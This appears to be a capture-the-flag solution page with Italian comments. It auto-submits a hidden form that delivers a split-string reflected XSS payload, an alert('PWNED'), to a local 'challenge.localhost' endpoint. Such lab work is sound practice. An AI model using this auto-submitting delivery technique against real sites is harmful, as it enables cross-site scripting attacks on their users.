<!DOCTYPE html>
<html>
  <body>
    <script>
      // Costruisci il payload in modo da evitare di chiudere prematuramente lo script
      const xss = "<script>alert('PWNED')</scr" + "ipt>";
      const url = "http://challenge.localhost/ephemeral";

      // Crea il form
      const form = document.createElement("form");
      form.method = "GET";
      form.action = url;

      // Crea il campo con il payload
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = "msg";
      input.value = xss;

      // Aggiungi input al form e invialo
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
    </script>
  </body>
</html>
